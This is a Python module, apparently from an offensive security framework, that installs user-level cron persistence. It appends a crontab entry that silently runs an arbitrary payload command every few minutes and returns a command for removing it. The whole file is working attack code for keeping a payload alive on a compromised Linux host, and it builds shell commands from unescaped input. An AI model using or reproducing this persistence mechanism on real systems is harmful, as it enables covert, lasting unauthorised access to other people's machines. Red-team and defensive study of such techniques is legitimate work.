from ..core import CronPersistence
from ..utils.helpers import run_command

class UserCronPersistence(CronPersistence):
    def create(self, payload_command: str, interval_minutes: int = 10):
        print(f"[*] Installing user cron persistence for {self.current_user}...")
        print(f"[*] Interval: Every {interval_minutes} minutes")

        result = run_command('crontab -l 2>/dev/null')
        existing_cron = result['stdout'] if result['success'] else ''
        cron_entry = f"*/{interval_minutes} * * * * {payload_command} >/dev/null 2>&1\n"

        if cron_entry.strip() in existing_cron.splitlines():
            print("[!] Entry already exists")
            return None

        new_cron = existing_cron + cron_entry
        write_cmd = f'echo "{new_cron.strip()}" | crontab -'
        result = run_command(write_cmd)

        if result['success']:
            print(f"[+] User cron persistence installed successfully")
            return {
                'method': 'user_cron',
                'user': self.current_user,
                'interval': interval_minutes,
                'payload': payload_command,
                'remove_command': f'crontab -l | grep -v "{payload_command}" | crontab -'
            }
        else:
            print(f"[-] Failed: {result.get('stderr', 'Unknown error')}")
            return None